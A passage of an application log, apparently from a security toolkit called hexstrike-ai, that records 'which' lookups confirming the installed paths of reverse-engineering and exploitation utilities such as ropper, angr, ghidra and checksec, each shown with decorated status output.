2025-10-24 06:15:12,382 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3228
2025-10-24 06:15:12,383 - __main__ - INFO - 📤 STDOUT: /usr/bin/ropgadget
2025-10-24 06:15:12,386 - __main__ - INFO - 🧹 CLEANUP: Process 3228 removed from registry
2025-10-24 06:15:12,386 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,386 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,386 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,386 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,386 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which ropgadget
2025-10-24 06:15:12,386 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,386 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 19 bytes
2025-10-24 06:15:12,386 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,386 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,386 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,386 - __main__ - INFO - 💾 Cached result for command: which ropgadget
2025-10-24 06:15:12,386 - __main__ - INFO - 🔍 Cache MISS for command: which checksec
2025-10-24 06:15:12,386 - __main__ - INFO - 🚀 EXECUTING: which checksec
2025-10-24 06:15:12,386 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,386 - __main__ - INFO - 🆔 PROCESS: PID 3233 started
2025-10-24 06:15:12,386 - __main__ - INFO - 🆔 REGISTERED: Process 3233 - which checksec...
2025-10-24 06:15:12,387 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3233
2025-10-24 06:15:12,390 - __main__ - INFO - 📤 STDOUT: /opt/hexstrike-ai/hexstrike-env/bin/checksec
2025-10-24 06:15:12,391 - __main__ - INFO - 🧹 CLEANUP: Process 3233 removed from registry
2025-10-24 06:15:12,391 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,391 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,391 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,391 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,391 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which checksec
2025-10-24 06:15:12,391 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,391 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 45 bytes
2025-10-24 06:15:12,391 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,391 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,391 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,391 - __main__ - INFO - 💾 Cached result for command: which checksec
2025-10-24 06:15:12,391 - __main__ - INFO - 🔍 Cache MISS for command: which objdump
2025-10-24 06:15:12,391 - __main__ - INFO - 🚀 EXECUTING: which objdump
2025-10-24 06:15:12,391 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,392 - __main__ - INFO - 🆔 PROCESS: PID 3238 started
2025-10-24 06:15:12,392 - __main__ - INFO - 🆔 REGISTERED: Process 3238 - which objdump...
2025-10-24 06:15:12,393 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3238
2025-10-24 06:15:12,394 - __main__ - INFO - 📤 STDOUT: /usr/bin/objdump
2025-10-24 06:15:12,398 - __main__ - INFO - 🧹 CLEANUP: Process 3238 removed from registry
2025-10-24 06:15:12,398 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,398 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,398 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,398 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,398 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which objdump
2025-10-24 06:15:12,398 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,398 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 06:15:12,398 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,398 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,398 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,398 - __main__ - INFO - 💾 Cached result for command: which objdump
2025-10-24 06:15:12,398 - __main__ - INFO - 🔍 Cache MISS for command: which ghidra
2025-10-24 06:15:12,398 - __main__ - INFO - 🚀 EXECUTING: which ghidra
2025-10-24 06:15:12,398 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,399 - __main__ - INFO - 🆔 PROCESS: PID 3243 started
2025-10-24 06:15:12,399 - __main__ - INFO - 🆔 REGISTERED: Process 3243 - which ghidra...
2025-10-24 06:15:12,399 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3243
2025-10-24 06:15:12,401 - __main__ - INFO - 📤 STDOUT: /usr/bin/ghidra
2025-10-24 06:15:12,405 - __main__ - INFO - 🧹 CLEANUP: Process 3243 removed from registry
2025-10-24 06:15:12,405 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,405 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,405 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,405 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,405 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which ghidra
2025-10-24 06:15:12,405 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,405 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 16 bytes
2025-10-24 06:15:12,405 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,405 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,405 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,405 - __main__ - INFO - 💾 Cached result for command: which ghidra
2025-10-24 06:15:12,405 - __main__ - INFO - 🔍 Cache MISS for command: which ropper
2025-10-24 06:15:12,405 - __main__ - INFO - 🚀 EXECUTING: which ropper
2025-10-24 06:15:12,405 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,406 - __main__ - INFO - 🆔 PROCESS: PID 3248 started
2025-10-24 06:15:12,406 - __main__ - INFO - 🆔 REGISTERED: Process 3248 - which ropper...
2025-10-24 06:15:12,406 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3248
2025-10-24 06:15:12,408 - __main__ - INFO - 📤 STDOUT: /usr/bin/ropper
2025-10-24 06:15:12,410 - __main__ - INFO - 🧹 CLEANUP: Process 3248 removed from registry
2025-10-24 06:15:12,410 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,410 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,411 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,411 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,411 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which ropper
2025-10-24 06:15:12,411 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,411 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 16 bytes
2025-10-24 06:15:12,411 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,411 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,411 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,411 - __main__ - INFO - 💾 Cached result for command: which ropper
2025-10-24 06:15:12,411 - __main__ - INFO - 🔍 Cache MISS for command: which angr
2025-10-24 06:15:12,411 - __main__ - INFO - 🚀 EXECUTING: which angr
2025-10-24 06:15:12,411 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,411 - __main__ - INFO - 🆔 PROCESS: PID 3253 started
2025-10-24 06:15:12,411 - __main__ - INFO - 🆔 REGISTERED: Process 3253 - which angr...
2025-10-24 06:15:12,412 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3253
2025-10-24 06:15:12,413 - __main__ - INFO - 📤 STDOUT: /opt/hexstrike-ai/hexstrike-env/bin/angr
2025-10-24 06:15:12,416 - __main__ - INFO - 🧹 CLEANUP: Process 3253 removed from registry
2025-10-24 06:15:12,416 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,416 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,416 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,416 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,416 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which angr
2025-10-24 06:15:12,416 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,416 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 41 bytes
2025-10-24 06:15:12,416 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,416 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,416 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,416 - __main__ - INFO - 💾 Cached result for command: which angr
2025-10-24 06:15:12,416 - __main__ - INFO - 🔍 Cache MISS for command: which libc-database
2025-10-24 06:15:12,416 - __main__ - INFO - 🚀 EXECUTING: which libc-database
2025-10-24 06:15:12,416 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,417 - __main__ - INFO - 🆔 PROCESS: PID 3258 started
2025-10-24 06:15:12,417 - __main__ - INFO - 🆔 REGISTERED: Process 3258 - which libc-database...
2025-10-24 06:15:12,417 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3258
2025-10-24 06:15:12,419 - __main__ - INFO - 🧹 CLEANUP: Process 3258 removed from registry
2025-10-24 06:15:12,419 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.00s
2025-10-24 06:15:12,419 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,419 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:12,419 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,419 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which libc-database
2025-10-24 06:15:12,419 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,419 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:12,419 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:12,419 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:12,419 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,420 - __main__ - INFO - 🔍 Cache MISS for command: which pwninit
2025-10-24 06:15:12,420 - __main__ - INFO - 🚀 EXECUTING: which pwninit
2025-10-24 06:15:12,420 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,420 - __main__ - INFO - 🆔 PROCESS: PID 3263 started
2025-10-24 06:15:12,420 - __main__ - INFO - 🆔 REGISTERED: Process 3263 - which pwninit...
2025-10-24 06:15:12,421 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3263
2025-10-24 06:15:12,424 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/pwninit
2025-10-24 06:15:12,425 - __main__ - INFO - 🧹 CLEANUP: Process 3263 removed from registry
2025-10-24 06:15:12,425 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,425 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,426 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,426 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,426 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which pwninit
2025-10-24 06:15:12,426 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,426 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 23 bytes
2025-10-24 06:15:12,426 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,426 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,426 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,426 - __main__ - INFO - 💾 Cached result for command: which pwninit
2025-10-24 06:15:12,426 - __main__ - INFO - 🔍 Cache MISS for command: which steghide
2025-10-24 06:15:12,426 - __main__ - INFO - 🚀 EXECUTING: which steghide
2025-10-24 06:15:12,427 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,427 - __main__ - INFO - 🆔 PROCESS: PID 3268 started
2025-10-24 06:15:12,427 - __main__ - INFO - 🆔 REGISTERED: Process 3268 - which steghide...
2025-10-24 06:15:12,427 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3268
2025-10-24 06:15:12,429 - __main__ - INFO - 📤 STDOUT: /usr/bin/steghide
2025-10-24 06:15:12,431 - __main__ - INFO - 🧹 CLEANUP: Process 3268 removed from registry
2025-10-24 06:15:12,431 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,431 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,431 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,431 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,431 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which steghide
2025-10-24 06:15:12,431 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,431 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 18 bytes
2025-10-24 06:15:12,431 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,431 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,431 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,432 - __main__ - INFO - 💾 Cached result for command: which steghide
2025-10-24 06:15:12,432 - __main__ - INFO - 🔍 Cache MISS for command: which hashpump
2025-10-24 06:15:12,432 - __main__ - INFO - 🚀 EXECUTING: which hashpump
2025-10-24 06:15:12,432 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,432 - __main__ - INFO - 🆔 PROCESS: PID 3273 started
2025-10-24 06:15:12,432 - __main__ - INFO - 🆔 REGISTERED: Process 3273 - which hashpump...
2025-10-24 06:15:12,432 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3273
2025-10-24 06:15:12,436 - __main__ - INFO - 🧹 CLEANUP: Process 3273 removed from registry
2025-10-24 06:15:12,436 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.00s
2025-10-24 06:15:12,436 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,436 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:12,436 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,436 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which hashpump
2025-10-24 06:15:12,436 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,436 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:12,436 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:12,436 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:12,436 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,436 - __main__ - INFO - 🔍 Cache MISS for command: which foremost
2025-10-24 06:15:12,436 - __main__ - INFO - 🚀 EXECUTING: which foremost
2025-10-24 06:15:12,436 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,436 - __main__ - INFO - 🆔 PROCESS: PID 3278 started
2025-10-24 06:15:12,436 - __main__ - INFO - 🆔 REGISTERED: Process 3278 - which foremost...
2025-10-24 06:15:12,437 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3278
2025-10-24 06:15:12,439 - __main__ - INFO - 📤 STDOUT: /usr/bin/foremost
2025-10-24 06:15:12,439 - __main__ - INFO - 🧹 CLEANUP: Process 3278 removed from registry
2025-10-24 06:15:12,439 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,439 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,439 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,439 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,439 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which foremost
2025-10-24 06:15:12,439 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,439 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 18 bytes
2025-10-24 06:15:12,439 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,439 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,439 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,439 - __main__ - INFO - 💾 Cached result for command: which foremost
2025-10-24 06:15:12,439 - __main__ - INFO - 🔍 Cache MISS for command: which exiftool
2025-10-24 06:15:12,439 - __main__ - INFO - 🚀 EXECUTING: which exiftool
2025-10-24 06:15:12,439 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,440 - __main__ - INFO - 🆔 PROCESS: PID 3283 started
2025-10-24 06:15:12,440 - __main__ - INFO - 🆔 REGISTERED: Process 3283 - which exiftool...
2025-10-24 06:15:12,440 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3283
2025-10-24 06:15:12,442 - __main__ - INFO - 📤 STDOUT: /usr/bin/exiftool
2025-10-24 06:15:12,443 - __main__ - INFO - 🧹 CLEANUP: Process 3283 removed from registry
2025-10-24 06:15:12,443 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,443 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,443 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,443 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,443 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which exiftool
2025-10-24 06:15:12,443 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,443 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 18 bytes
2025-10-24 06:15:12,443 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,443 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,443 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,443 - __main__ - INFO - 💾 Cached result for command: which exiftool
2025-10-24 06:15:12,443 - __main__ - INFO - 🔍 Cache MISS for command: which strings
2025-10-24 06:15:12,443 - __main__ - INFO - 🚀 EXECUTING: which strings
2025-10-24 06:15:12,443 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,443 - __main__ - INFO - 🆔 PROCESS: PID 3288 started
2025-10-24 06:15:12,443 - __main__ - INFO - 🆔 REGISTERED: Process 3288 - which strings...
2025-10-24 06:15:12,444 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3288
2025-10-24 06:15:12,446 - __main__ - INFO - 📤 STDOUT: /usr/bin/strings
2025-10-24 06:15:12,448 - __main__ - INFO - 🧹 CLEANUP: Process 3288 removed from registry
2025-10-24 06:15:12,448 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,448 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,448 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,448 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,448 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which strings
2025-10-24 06:15:12,448 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,448 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 06:15:12,448 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,448 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,448 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,448 - __main__ - INFO - 💾 Cached result for command: which strings
2025-10-24 06:15:12,448 - __main__ - INFO - 🔍 Cache MISS for command: which xxd
2025-10-24 06:15:12,448 - __main__ - INFO - 🚀 EXECUTING: which xxd
2025-10-24 06:15:12,448 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,449 - __main__ - INFO - 🆔 PROCESS: PID 3293 started
2025-10-24 06:15:12,449 - __main__ - INFO - 🆔 REGISTERED: Process 3293 - which xxd...
2025-10-24 06:15:12,450 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3293
2025-10-24 06:15:12,451 - __main__ - INFO - 📤 STDOUT: /usr/bin/xxd
2025-10-24 06:15:12,453 - __main__ - INFO - 🧹 CLEANUP: Process 3293 removed from registry
2025-10-24 06:15:12,453 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,453 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,453 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,453 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,453 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which xxd
2025-10-24 06:15:12,453 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,453 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 13 bytes
2025-10-24 06:15:12,453 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,453 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,453 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,453 - __main__ - INFO - 💾 Cached result for command: which xxd
2025-10-24 06:15:12,453 - __main__ - INFO - 🔍 Cache MISS for command: which file
2025-10-24 06:15:12,453 - __main__ - INFO - 🚀 EXECUTING: which file
2025-10-24 06:15:12,453 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,454 - __main__ - INFO - 🆔 PROCESS: PID 3298 started
